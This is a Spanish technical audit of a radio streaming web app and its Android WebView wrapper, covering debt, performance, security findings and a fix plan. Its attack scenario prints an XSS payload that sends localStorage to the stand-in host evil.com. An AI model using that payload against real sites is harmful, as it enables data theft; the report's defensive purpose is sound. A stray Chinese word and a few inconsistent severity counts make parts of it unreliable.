# REPORTE DE AUDITORÍA TÉCNICA v1.0

**Proyecto:** Radio Sonido Celestial  
**Tipo:** Aplicación híbrida Web (PWA) + Android WebView  
**Fecha:** Junio 2026  
**Auditor:** Arquitecto de Software Senior  

---

## Índice

1. [Arquitectura actual](#1-arquitectura-actual)
2. [Diagrama de flujo](#2-diagrama-de-flujo)
3. [Deuda técnica](#3-deuda-técnica)
4. [Código muerto](#4-código-muerto)
5. [Problemas de rendimiento](#5-problemas-de-rendimiento)
6. [Problemas de seguridad](#6-problemas-de-seguridad)
7. [Escalabilidad](#7-escalabilidad)
8. [Calidad del código](#8-calidad-del-código)
9. [Riesgo de fallos](#9-riesgo-de-fallos)
10. [Recomendaciones priorizadas](#10-recomendaciones-priorizadas)
11. [Estimación de complejidad](#11-estimación-de-complejidad)

---

## 1. Arquitectura actual

### 1.1 Vista general

El proyecto implementa una arquitectura **híbrida Web + Android WebView** donde la misma base de código HTML/CSS/JS se despliega en dos canales:

```
┌──────────────────────────────────────────────────────────┐
│                     CANAL WEB (PWA)                       │
│                                                           │
│  Navegador / PWA instalada                                │
│       │                                                   │
│       ▼                                                   │
│  index.html ──► style.css ──► script.js                   │
│       │                                                   │
│       ├──► service-worker.js (cache offline)              │
│       ├──► manifest.json (instalable)                     │
│       └──► Zeno FM (stream + SSE metadata)                │
│                                                           │
│  Dependencias externas:                                   │
│    - Font Awesome 6.4.0 (CDN)                             │
│    - Google Fonts: Outfit (CDN)                           │
│    - iTunes Search API (carátulas)                        │
└──────────────────────┬───────────────────────────────────┘
                       │  assets duplicados manualmente
                       ▼
┌──────────────────────────────────────────────────────────┐
│                   CANAL ANDROID (WebView)                  │
│                                                           │
│  MainActivity.java                                        │
│       │                                                   │
│       ▼                                                   │
│  WebView                                                  │
│       │                                                   │
│       ├──► Carga: file:///android_asset/index.html        │
│       ├──► JavaScript habilitado                          │
│       ├──► DomStorage habilitado                          │
│       ├──► Autoplay de audio permitido                    │
│       └──► WebViewClient personalizado (navegación)       │
│                                                           │
│  Permisos: INTERNET, WAKE_LOCK (no usado)                 │
│  SDK: min 24, target 34, compile 34                       │
│  Build: Gradle 9.0-milestone-1, Java 8                    │
└──────────────────────────────────────────────────────────┘
```

### 1.2 Decisión arquitectónica crítica

La app Android es un **WebView sin funcionalidad nativa adicional**. Esto es una **redundancia arquitectónica**: la PWA ya es instalable en Android y ofrece la misma experiencia. El WebView no agrega:

- Reproducción en background (la PWA no lo tiene, el WebView tampoco)
- Notificaciones push nativas
- Control de medios nativo (la PWA tiene Media Session API)
- Integración con Android Auto o wearables

El valor real del WebView es casi nulo frente al costo de mantenimiento de dos canales.

### 1.3 Stack tecnológico

| Componente | Tecnología | Versión |
|---|---|---|
| UI Web | HTML5 + CSS3 + Vanilla JS | — |
| Streaming | Zeno FM (HLS/MP3) | — |
| Metadatos | Zeno FM SSE API | — |
| Carátulas | iTunes Search API | — |
| Cache offline | Service Worker | — |
| App Android | WebView + Java | minSdk 24 |
| Build Android | Gradle | 9.0-milestone-1 |
| AndroidX | appcompat | 1.6.1 |
| Material | Material Components | 1.11.0 |
| Iconos | Font Awesome | 6.4.0 |
| Tipografía | Google Fonts: Outfit | — |

---

## 2. Diagrama de flujo

### 2.1 Inicialización

```
DOMContentLoaded
  │
  ├──► Obtener referencias DOM (playBtn, volumeSlider, miniArt, ...)
  ├──► Crear Audio(streamUrl) con preload='none'
  ├──► Iniciar fetchMetadata() ──► EventSource(SSE) ──► onmessage ──► updateMetadata()
  ├──► Registrar Service Worker
  ├──► Configurar listeners (play, volume, share, keyboard)
  ├──► Inicializar sistema de historial
  ├──► Iniciar canvas starfield (requestAnimationFrame loop)
  └──► renderHistory() (estado inicial vacío)
```

### 2.2 Reproducción

```
Usuario toca Play
  │
  ├──► audio.src = streamUrl
  ├──► audio.load()
  ├──► audio.play()
  │     │
  │     ├──► Éxito: isPlaying=true, updateUIState(true)
  │     │
  │     └──► Error: alert("No se pudo reproducir")
  │
Usuario toca Pause
  │
  ├──► audio.pause()
  ├──► audio.src = ''  (descarga el stream)
  └──► isPlaying=false, updateUIState(false)
```

### 2.3 Metadatos (loop continuo)

```
EventSource SSE ──► onmessage(event)
  │
  ├──► JSON.parse(event.data)
  │     │
  │     ├──► Error: console.error ──► esperar próximo evento
  │     │
  │     └──► Éxito: updateMetadata(data)
  │           │
  │           ├──► ¿streamTitle igual al anterior? ──► return (no duplicar)
  │           │
  │           ├──► Parsear "Artista - Título"
  │           ├──► Actualizar UI (songTitle, artistName)
  │           │
  │           ├──► ¿data.image existe?
  │           │     │
  │           │     ├──► Sí: set background + miniArt.src = data.image
  │           │     │
  │           │     └──► No: fetchAlbumArt(artist, title)
  │           │           │
  │           │           ├──► fetch a iTunes Search API
  │           │           ├──► set background + miniArt.src
  │           │           └──► updateLastHistoryArt(url)
  │           │
  │           ├──► addToHistory(artist, title, image)
  │           ├──► MediaSession API update
  │           └──► (si panel abierto) renderHistory()
  │
EventSource onerror
  │
  ├──► eventSource.close()
  └──► setTimeout(fetchMetadata, 5000)  // reconexión fija
```

### 2.4 Flujo de navegación Android

```
Usuario abre app
  │
  ├──► MainActivity.onCreate()
  │     │
  │     ├──► setContentView(R.layout.activity_main)  // WebView fullscreen
  │     ├──► Configurar WebSettings:
  │     │     ├──► JavaScriptEnabled = true
  │     │     ├──► DomStorageEnabled = true
  │     │     └──► MediaPlaybackRequiresUserGesture = false
  │     │
  │     ├──► setWebViewClient(new MyWebViewClient())
  │     └──► loadUrl("file:///android_asset/index.html")
  │
  ├──► WebView carga index.html
  ├──► index.html carga script.js
  └──► (a partir de aquí, todo es JS)
```

---

## 3. Deuda técnica

### 3.1 Deuda arquitectónica

| ID | Hallazgo | Severidad | Impacto |
|----|----------|-----------|---------|
| ARCH-01 | **WebView sin valor nativo**: la app Android es idéntica a la PWA instalable. No hay reproducción en background, notificaciones, ni controles de medios nativos. | **ALTO** | El esfuerzo de mantener el wrapper Android no se justifica. Cada cambio web requiere copia manual a assets. |
| ARCH-02 | **Assets duplicados manualmente**: `index.html`, `style.css`, `script.js`, `manifest.json`, `logo.png` existen en raíz y en `android_app/app/src/main/assets/`. No hay script de sincronización. | **ALTO** | Garantizado que en algún momento los assets se desincronizarán y la app Android mostrará una versión distinta a la web. |
| ARCH-03 | **Sin manejo de ciclo de vida Android**: `MainActivity` no implementa `onSaveInstanceState`, `onRestoreInstanceState`. Una rotación de pantalla o cambio de configuración destruye y recrea la Activity, perdiendo el estado del WebView. | **MEDIO** | El usuario pierde el estado de reproducción al rotar el dispositivo. |
| ARCH-04 | **Sin build tooling para el frontend**: No hay bundler (Webpack/Vite), no hay minimización, no hay tree-shaking. El JS se sirve tal cual. | **MEDIO** | 366 líneas de JS plano sin optimización, sin TypeScript, sin lint. |
| ARCH-05 | **Service Worker monocanal**: Estrategia Cache-Only para assets estáticos con cache-all en install. Cualquier fallo de red durante install bloquea todo el SW. | **MEDIO** | El SW puede no registrarse si Font Awesome o Google Fonts están caídos. |

### 3.2 Deuda de código

| ID | Hallazgo | Severidad | Ubicación |
|----|----------|-----------|-----------|
| CODE-01 | **Monolito de 366 líneas en una sola closure**: Todo el JS está dentro de `DOMContentLoaded`. Sin módulos, sin separación de responsabilidades. | **ALTO** | `script.js:1-366` |
| CODE-02 | **URLs hardcodeadas en 4 lugares**: Stream, metadata SSE, iTunes API base, WhatsApp. Cualquier cambio requiere editar código. | **MEDIO** | `script.js:10-11,36`, `index.html:70` |
| CODE-03 | **Silent catch blocks**: `saveHistory` tiene `catch {}` vacío — traga errores sin logging. | **BAJO** | `script.js:222` |
| CODE-04 | **`Activity` sin `@SuppressLint` para WebView**: El linter de Android marcaría `setJavaScriptEnabled(true)` como riesgo de seguridad. | **BAJO** | `MainActivity.java:23` |
| CODE-05 | **`AndroidManifest.xml` declara `WAKE_LOCK` no usado**: Permiso solicitado pero nunca adquirido via `PowerManager`. | **BAJO** | `AndroidManifest.xml:6` |
| CODE-06 | **Java 8 con compileSdk 34**: Se compila con Java 8 cuando minSdk 24+ soporta Java 11. Se pierden mejoras de rendimiento y sintaxis. | **BAJO** | `build.gradle:25-28` |
| CODE-07 | **`onBackPressed()` deprecado**: Desde API 33 (Android 13), el método está deprecado. Debería usarse `OnBackPressedDispatcher`. | **BAJO** | `MainActivity.java:60` |

### 3.3 Deuda de testing

| ID | Hallazgo | Severidad |
|----|----------|-----------|
| TEST-01 | **Cero tests**: No hay tests unitarios, de integración, ni end-to-end en ningún nivel (ni web, ni Android). | **CRÍTICO** |
| TEST-02 | **Sin instrumentación Android**: El `build.gradle` incluye `testInstrumentationRunner` pero no hay ningún test escrito. | **MEDIO** |
| TEST-03 | **Sin lint/CI pipeline**: No hay ESLint, Stylelint, Checkstyle, ni GitHub Actions. | **MEDIO** |

---

## 4. Código muerto

| ID | Archivo | Líneas | Elemento | Severidad |
|----|---------|--------|----------|-----------|
| DEAD-01 | `index.html:23` | 1 | `<i class="fas fa-chevron-down" style="opacity:0">` — icono invisible usado como spacer | **BAJO** |
| DEAD-02 | `index.html:42-44` | 3 | Botón `.favorite-btn` con icono corazón — **sin event listener en JS** | **MEDIO** |
| DEAD-03 | `index.html:89` | 1 | `<div class="visualizer-bars" style="display:none">` — hidden permanente, no referenciado en JS | **BAJO** |
| DEAD-04 | `index.html:86` | 1 | Comentario `<!-- Removed old social-share div... -->` — artefacto de refactor | **BAJO** |
| DEAD-05 | `style.css:308-325` | 18 | Clases `.social-share`, `.social-btn` — **no existen en el HTML** | **MEDIO** |
| DEAD-06 | `style.css:328-358` | 31 | Keyframes `slideUpFade` + clases `.animate-entrance`, `.delay-1` a `.delay-4` — **no usadas por ningún elemento** | **MEDIO** |
| DEAD-07 | `AndroidManifest.xml:6` | 1 | Permiso `WAKE_LOCK` — declarado pero nunca adquirido en Java | **BAJO** |
| DEAD-08 | `build.gradle:16` | 1 | `testInstrumentationRunner` — dependency declarada pero no hay tests | **BAJO** |
| DEAD-09 | `build.gradle:21` | 1 | `minifyEnabled false` en release — código sin ofuscar en producción | **ALTO** |

**Total código muerto: ~58 líneas** (sin contar el permiso y config de test).

---

## 5. Problemas de rendimiento

| ID | Hallazgo | Severidad | Detalle técnico |
|----|----------|-----------|-----------------|
| PERF-01 | **Canvas starfield siempre activo** | **ALTO** | `requestAnimationFrame` loop infinito en `animateStars()` (línea 349). 200 objetos `Star` actualizados y renderizados 60fps incluso cuando el usuario no está interactuando. En WebView Android, el canvas compite por la GPU con la propia página. |
| PERF-02 | **CSS blur(80px) extremo** | **ALTO** | `filter: blur(80px) brightness(0.4)` en `body::before` (línea 53). Un blur de 80px requiere un kernel de convolución enorme. Cada cambio de álbum dispara un re-paint completo de la página. En WebView, esto puede causar jank severo. |
| PERF-03 | **Re-render completo del historial** | **MEDIO** | `renderHistory()` (línea 260) destruye y reconstruye todo el `innerHTML` con `history.map().join('')` en cada cambio de canción si el panel está abierto. Debería hacer append del nuevo item. |
| PERF-04 | **iTunes API sin caché** | **MEDIO** | Cada cambio de canción sin `data.image` dispara un `fetch` a iTunes Search API. Si la misma canción suena dos veces en una sesión, se consulta la API dos veces. 0 memorización. |
| PERF-05 | **Sin debounce en resize** | **BAJO** | `window.addEventListener('resize', ...)` (línea 358) reinicializa 200 estrellas en cada frame de resize. Sin debounce, un giro de dispositivo puede disparar 10+ reinicios. |
| PERF-06 | **100vh + 100dvh duplicados** | **BAJO** | `style.css:19-20,63-64` declaran ambos valores. El navegador calcula layout dos veces por elemento. En móvil, `100dvh` es suficiente y `100vh` es el fallback. |
| PERF-07 | **Service Worker cachea CDNs en install** | **MEDIO** | `ASSETS` incluye URLs de CDN (Font Awesome, Google Fonts). `cache.addAll` falla si **cualquier** recurso falla, bloqueando todo el registro del SW. |
| PERF-08 | **`querySelector` duplicado sin cache** | **BAJO** | `document.querySelector('.album-art-wrapper')` se ejecuta dos veces en `updateUIState` (líneas 155 y 159). Debería cachearse en una variable. |

---

## 6. Problemas de seguridad

| ID | Hallazgo | Severidad | CVSS Estimado | Detalle |
|----|----------|-----------|---------------|---------|
| SEC-01 | **WebView: JavaScript sin restricciones + file access** | **CRÍTICO** | 8.1 | `setJavaScriptEnabled(true)` sin llamar a `setAllowFileAccess(false)`. Cualquier vulnerabilidad XSS en el JS permite leer archivos locales del dispositivo Android. |
| SEC-02 | **Intents arbitrarios desde WebView** | **ALTO** | 7.5 | `shouldOverrideUrlLoading` (línea 35-56) crea un `Intent.ACTION_VIEW` para **cualquier** URL no HTTP/HTTPS. `sms://`, `tel://`, `intent://`, `geo://` se ejecutan sin confirmación. Esto es un **Open Intent Launcher**. |
| SEC-03 | **Sin Content-Security-Policy** | **MEDIO** | 6.1 | La página no define `<meta http-equiv="Content-Security-Policy">`. Si se inyecta un script (vía XSS en albumArt o metadatos), se ejecuta sin restricciones. |
| SEC-04 | **albumArt inyectado sin sanitizar** | **MEDIO** | 5.4 | `renderHistory()` (línea 269) inyecta `item.albumArt` directamente en `<img src="${item.albumArt}">` sin `escapeHtml`. Aunque proviene de localStorage, un ataque de corrupción de storage permite XSS. |
| SEC-05 | **WebView: Content Access no restringido** | **MEDIO** | 5.0 | No se llama a `setAllowContentAccess(false)`. El WebView puede acceder a Content Providers del sistema si se carga contenido malicioso. |
| SEC-06 | **WebView: JavaScript can open windows** | **BAJO** | 3.1 | No se llama a `setJavaScriptCanOpenWindowsAutomatically(false)`. Un script malicioso podría abrir popups. |
| SEC-07 | **localStorage en texto plano** | **BAJO** | 2.6 | El historial de canciones se guarda sin cifrar. No hay datos sensibles hoy, pero es un mal precedente. |

### 6.1 Vector de ataque identificado (escenario real)

1. Atacante控制a la metadata de Zeno FM (o un MITM en la red)
2. Inyecta `streamTitle` con `"><img onerror="fetch('https://evil.com/steal?data='+localStorage)">
3. El parser `split('-')` lo procesa, se inyecta en `songTitleEl.textContent` (safe, usa textContent)
4. Pero si `data.image` viene con `javascript:...` o una URL manipulada, se inyecta en `miniArt.src` y en `addToHistory` → `albumArt`
5. En `renderHistory`, se inyecta en el `src` del img (no sanitizado) → no es XSS directo en img src, pero el `onerror` del img (línea 269) podría ser explotado si se combina con otra inyección

---

## 7. Escalabilidad

### 7.1 Escalabilidad horizontal (múltiples estaciones)

| Aspecto | Estado actual | Problema |
|---------|---------------|----------|
| Múltiples streams | No soportado | `streamUrl` y `metadataUrl` son constantes. Agregar otra emisora requeriría reescribir toda la capa de datos. |
| Múltiples fuentes de metadata | No soportado | El parser está hardcodeado para Zeno FM. iTunes es la única fuente de carátulas. |
| Internacionalización | No soportado | Textos hardcodeados en español ("Cargando...", "En Vivo", "Historial"). |
| Tematización | Limitado | CSS custom properties permiten cambiar colores, pero no hay sistema de temas. |

### 7.2 Escalabilidad vertical (más usuarios)

| Aspecto | Estado actual | Problema |
|---------|---------------|----------|
| Concurrencia | Sin servidor propio | Zeno FM maneja toda la concurrencia. La app no tiene backend. |
| Caché | Sin CDN propio | Assets servidos desde GitHub Pages o similar (por el origen del proyecto). Font Awesome y Google Fonts son CDNs externos. |
| Streaming | Dependencia total de Zeno FM | Si Zeno FM cae, la app queda completamente inoperativa (sin música y sin metadata). Sin fallback. |

### 7.3 Veredicto de escalabilidad

**La app no está diseñada para escalar.** Es una solución monolítica para una sola emisora con un solo proveedor de streaming. Escalar requeriría una reescritura arquitectónica profunda (backend propio, cola de metadata, múltiples fuentes de audio, etc.).

---

## 8. Calidad del código

### 8.1 JavaScript (`script.js`)

| Aspecto | Evaluación | Detalle |
|---------|------------|---------|
| Modularidad | **MALO** | Todo en una closure anónima de 366 líneas. Cero separación de concerns. |
| Tipado | **MALO** | JavaScript sin TypeScript, sin JSDoc. Ninguna función tiene tipos documentados. |
| Nomenclatura | **ACEPTABLE** | camelCase consistente. Nombres descriptivos en general. |
| Manejo de errores | **REGULAR** | Mezcla de `console.error`, `console.log`, `alert()`, y `catch {}` vacío. Inconsistente. |
| Side effects | **MALO** | Funciones mutan estado global (`currentStreamTitle`, `isPlaying`, DOM) sin indicarlo. |
| Comentarios | **REGULAR** | Algunos comentarios útiles, otros son ruido (`// Gold Brand Color`, `// For anchors`). |
| Complejidad ciclomática | **ACEPTABLE** | Las funciones son relativamente pequeñas, aunque `updateMetadata` hace 3 cosas diferentes. |
| Acoplamiento | **ALTO** | Todo el código está acoplado al DOM. No hay capa de datos separada de la capa de UI. |

**Métrica: ~60% de las líneas son lógica de negocio, ~40% son manipulación directa del DOM.**

### 8.2 Java (`MainActivity.java`)

| Aspecto | Evaluación | Detalle |
|---------|------------|---------|
| Estructura | **ACEPTABLE** | Clase simple, bien organizada. Inner class `MyWebViewClient` es idiomático. |
| Null safety | **REGULAR** | Cast sin null-check: `(WebView) findViewById(R.id.webview)` — podría ser `findViewById<WebView>(R.id.webview)`. |
| Manejo de excepciones | **REGULAR** | `catch (Exception e)` genérico (línea 52) — traga todo tipo de error. |
| Lifecycle | **MALO** | No se guarda/restaura el estado del WebView. |

### 8.3 CSS (`style.css`)

| Aspecto | Evaluación | Detalle |
|---------|------------|---------|
| Organización | **ACEPTABLE** | Secciones comentadas (Header, Artwork, Controls...). |
| Variables CSS | **BUENO** | Uso de custom properties para el theme. |
| Código muerto | **MALO** | ~50 líneas de CSS que no se aplican a nada. |
| Especificidad | **ACEPTABLE** | Selectores mayormente planos, sin abusos de `!important`. |
| Rendimiento CSS | **REGULAR** | `filter: blur(80px)` y animaciones continuas en `breathe`. |

---

## 9. Riesgo de fallos

### 9.1 Matriz de riesgos

| ID | Riesgo | Probabilidad | Impacto | Severidad | Mitigación actual |
|----|--------|-------------|---------|-----------|-------------------|
| RISK-01 | **WebView nulo en tiempo de ejecución**: `findViewById(R.id.webview)` sin null-check podría lanzar NullPointerException si el layout cambia | **Baja** | **Crítico** | **CRÍTICO** | Ninguna |
| RISK-02 | **SSE Connection flooding**: Si Zeno FM está caído, `onerror` reconecta cada 5s infinitamente. El usuario podría tener cientos de conexiones SSE fallidas acumuladas | **Media** | **Alto** | **ALTO** | Ninguna (reintento fijo sin backoff) |
| RISK-03 | **Service Worker no se registra**: Si Font Awesome CDN falla durante `install`, `cache.addAll` falla y el SW completo se descarta. La app pierde capacidad offline | **Media** | **Alto** | **ALTO** | Ninguna |
| RISK-04 | **iTunes API cambia o rate-limita**: Sin key, sin caché, sin fallback. Si iTunes bloquea la IP, las carátulas dejan de cargarse | **Baja** | **Medio** | **MEDIO** | Ninguna |
| RISK-05 | **Stream URL cambia**: Zeno FM puede rotar la URL del stream. La app deja de reproducir hasta que se actualice manualmente el código | **Baja** | **Crítico** | **ALTO** | Ninguna |
| RISK-06 | **WebView memory pressure**: En dispositivos de gama baja, el canvas + blur + stream de audio pueden causar OOM (Out of Memory). WebView se mata silenciosamente | **Media** | **Alto** | **ALTO** | Ninguna |
| RISK-07 | **Rotación de pantalla**: Destruye y recrea la Activity Android. El WebView se recarga desde cero, perdiendo el estado de reproducción | **Alta** | **Medio** | **MEDIO** | Ninguna |
| RISK-08 | **Google Play Store política**: Las apps que son solo un WebView alrededor de un sitio web pueden ser rechazadas o eliminadas | **Media** | **Alto** | **ALTO** | Ninguna |

### 9.2 Punto único de fallo

```
            ┌──────────────┐
            │   Zeno FM    │  ← Único proveedor de stream y metadata
            └──────┬───────┘
                   │
          ┌────────▼────────┐
          │   iTunes API    │  ← Única fuente de carátulas
          └────────┬────────┘
                   │
          ┌────────▼────────┐
          │  CDNs externos  │  ← Font Awesome + Google Fonts
          └────────┬────────┘
                   │
          ┌────────▼────────┐
          │   localStorage  │  ← Único storage (no cifrado, volátil)
          └─────────────────┘
```

**La app tiene 3 puntos únicos de fallo externos y 1 interno.**

---

## 10. Recomendaciones priorizadas

### Fase 0 — Correcciones críticas (inmediato, horas)

| # | Acción | Hallazgo relacionado |
|---|--------|----------------------|
| 0.1 | Agregar null-check para `playBtn`, `historyPanel` y todos los `getElementById` que se acceden sin validación | CODE-01, RISK-01 |
| 0.2 | Agregar `setAllowFileAccess(false)` y `setAllowContentAccess(false)` en el WebView | SEC-01 |
| 0.3 | Validar Intents con `PackageManager.queryIntentActivities()` antes de `startActivity` | SEC-02 |
| 0.4 | Sanitizar `albumArt` con `escapeHtml` en `renderHistory()` | SEC-04 |

### Fase 1 — Seguridad (corto plazo, días)

| # | Acción | Hallazgo |
|---|--------|----------|
| 1.1 | Agregar `<meta http-equiv="Content-Security-Policy">` en index.html | SEC-03 |
| 1.2 | Agregar `setJavaScriptCanOpenWindowsAutomatically(false)` en WebView | SEC-06 |
| 1.3 | Implementar reconnect exponencial en SSE (5s, 10s, 20s, 40s, max 60s) | RISK-02 |
| 1.4 | Separar CDNs del cache install del Service Worker (estrategia network-first) | RISK-03 |
| 1.5 | Manejar `onSaveInstanceState` en MainActivity para preservar URL del WebView | RISK-07 |

### Fase 2 — Estabilidad y mantenibilidad (corto plazo, días)

| # | Acción | Hallazgo |
|---|--------|----------|
| 2.1 | Eliminar código muerto: botón favorito, chevron fantasma, visualizer-bars | DEAD-01..06 |
| 2.2 | Eliminar CSS muerto: `.social-share`, `.animate-entrance`, keyframes | DEAD-05..06 |
| 2.3 | Eliminar `WAKE_LOCK` del manifest | DEAD-07 |
| 2.4 | Cachear `document.querySelector('.album-art-wrapper')` en variable | PERF-08 |
| 2.5 | Agregar caché simple para iTunes API (`Map<string, string>`) | PERF-04 |

### Fase 3 — Rendimiento (mediano plazo, semanas)

| # | Acción | Hallazgo |
|---|--------|----------|
| 3.1 | Pausar canvas starfield cuando la pestaña no es visible (usar `document.hidden` o `IntersectionObserver`) | PERF-01 |
| 3.2 | Reducir `blur(80px)` a `blur(40px)` o `blur(20px)` — probar calidad visual vs rendimiento | PERF-02 |
| 3.3 | Agregar debounce a resize del canvas (200ms o `requestAnimationFrame`) | PERF-05 |
| 3.4 | Implementar append en lugar de full-render en historial | PERF-03 |
| 3.5 | Eliminar `100vh` duplicado, dejar solo `100dvh` con fallback CSS | PERF-06 |

### Fase 4 — Calidad y automatización (mediano plazo, semanas)

| # | Acción | Hallazgo |
|---|--------|----------|
| 4.1 | Habilitar `minifyEnabled true` y configurar ProGuard para release | DEAD-09 |
| 4.2 | Migrar compileOptions a Java 11 | CODE-06 |
| 4.3 | Migrar `onBackPressed` a `OnBackPressedDispatcher` | CODE-07 |
| 4.4 | Crear script de build que copie assets web → android_app/assets/ automáticamente | ARCH-02 |
| 4.5 | Agregar ESLint + Stylelint al proyecto | TEST-03 |
| 4.6 | Agregar GitHub Actions para lint + build | TEST-03 |

### Fase 5 — Arquitectura (largo plazo, meses)

| # | Acción | Hallazgo |
|---|--------|----------|
| 5.1 | Evaluar si el wrapper Android aporta valor real vs. solo usar la PWA | ARCH-01 |
| 5.2 | Considerar migrar a Kotlin y agregar MediaSession nativa + notificaciones | ARCH-01 |
| 5.3 | Agregar reproducción en background (Foreground Service con notificación persistente) | ARCH-01 |
| 5.4 | Considerar ExoPlayer para mejor manejo de streams en Android | ARCH-01 |

---

## 11. Estimación de complejidad

### Leyenda

| Símbolo | Esfuerzo | Descripción |
|---------|----------|-------------|
| ★ | < 1 hora | Cambio trivial, una línea o archivo |
| ★★ | 1-4 horas | Cambio localizado, un archivo |
| ★★★ | 1-2 días | Cambio moderado, múltiples archivos |
| ★★★★ | 3-5 días | Cambio significativo, requiere diseño |
| ★★★★★ | 1-3 semanas | Cambio arquitectónico mayor |

### Detalle de estimaciones

| # | Acción | Complejidad | Archivos afectados | Riesgo de regresión |
|---|--------|-------------|-------------------|---------------------|
| 0.1 | Null-check en elementos DOM | ★ | 1 (`script.js`) | Bajo |
| 0.2 | WebView hardening (`setAllowFileAccess(false)`, etc.) | ★ | 1 (`MainActivity.java`) | Bajo |
| 0.3 | Validar Intents con PackageManager | ★★ | 1 (`MainActivity.java`) | Bajo |
| 0.4 | Sanitizar albumArt en renderHistory | ★ | 1 (`script.js`) | Bajo |
| 1.1 | Agregar CSP meta tag | ★ | 1 (`index.html`) | Bajo |
| 1.2 | Agregar `setJavaScriptCanOpenWindowsAutomatically(false)` | ★ | 1 (`MainActivity.java`) | Bajo |
| 1.3 | Reconnect exponencial en SSE | ★★ | 1 (`script.js`) | Bajo |
| 1.4 | Separar CDNs del SW install | ★★ | 1 (`service-worker.js`) | Medio |
| 1.5 | Manejar onSaveInstanceState | ★★ | 1 (`MainActivity.java`) | Medio |
| 2.1 | Eliminar HTML muerto | ★ | 1 (`index.html`) | Bajo |
| 2.2 | Eliminar CSS muerto | ★★ | 1 (`style.css`) | Bajo |
| 2.3 | Eliminar WAKE_LOCK | ★ | 1 (`AndroidManifest.xml`) | Bajo |
| 2.4 | Cachear selector DOM | ★ | 1 (`script.js`) | Bajo |
| 2.5 | Cache de iTunes API | ★★ | 1 (`script.js`) | Bajo |
| 3.1 | Pausar canvas en background | ★★ | 1 (`script.js`) | Bajo |
| 3.2 | Reducir blur CSS | ★ | 1 (`style.css`) | Bajo |
| 3.3 | Debounce en resize | ★ | 1 (`script.js`) | Bajo |
| 3.4 | Append en historial vs full-render | ★★ | 1 (`script.js`) | Medio |
| 3.5 | Eliminar 100vh duplicado | ★ | 1 (`style.css`) | Bajo |
| 4.1 | Habilitar minify + ProGuard | ★★ | 1 (`build.gradle`) + reglas | Medio |
| 4.2 | Migrar a Java 11 | ★ | 1 (`build.gradle`) | Bajo |
| 4.3 | Migrar OnBackPressedDispatcher | ★★ | 1 (`MainActivity.java`) | Medio |
| 4.4 | Script de sincronización de assets | ★★ | 1 (nuevo script) | Bajo |
| 4.5 | Agregar ESLint + Stylelint | ★★★ | múltiples (+ config) | Bajo |
| 4.6 | GitHub Actions CI | ★★★ | 1 (`.github/workflows`) | Bajo |
| 5.1 | Evaluar PWA vs wrapper Android | ★★★★ | — (análisis) | N/A |
| 5.2 | Migrar a Kotlin + MediaSession | ★★★★★ | Múltiples | Alto |
| 5.3 | Foreground Service + background playback | ★★★★★ | Múltiples | Alto |
| 5.4 | Integrar ExoPlayer | ★★★★★ | Múltiples | Alto |

### Por fase

| Fase | Complejidad total estimada | Esfuerzo total | Prioridad |
|------|---------------------------|----------------|-----------|
| **Fase 0** — Correcciones críticas | ★★★★ (4 estrellas total) | ~4 horas | **URGENTE** |
| **Fase 1** — Seguridad | ★★★★★★★ (7 estrellas total) | ~1 día | Alta |
| **Fase 2** — Estabilidad y mantenibilidad | ★★★★★★★ (7 estrellas total) | ~1 día | Alta |
| **Fase 3** — Rendimiento | ★★★★★★ (6 estrellas total) | ~1 día | Media |
| **Fase 4** — Calidad y automatización | ★★★★★★★★★ (9 estrellas total) | ~3 días | Media |
| **Fase 5** — Arquitectura | ★★★★★★★★★★★★★★★★★★ (18 estrellas total) | ~3-6 semanas | Baja |

---

## Resumen ejecutivo

| Métrica | Valor |
|---------|-------|
| **Hallazgos totales** | 42 |
| **CRÍTICOS** | 4 (ARCH-01, TEST-01, SEC-01, RISK-01) |
| **ALTO** | 12 |
| **MEDIO** | 18 |
| **BAJO** | 8 |
| **Código muerto (líneas)** | ~58 |
| **Deuda técnica estimada** | ~2-3 semanas para saldar Fases 0-2 |
| **Riesgo principal** | WebView sin hardening + SSE sin backoff + assets desincronizados |
| **Recomendación principal** | Ejecutar Fase 0 antes de cualquier cambio funcional nuevo |

---

*Documento generado como parte de auditoría técnica. No se modificó ningún archivo del proyecto.*
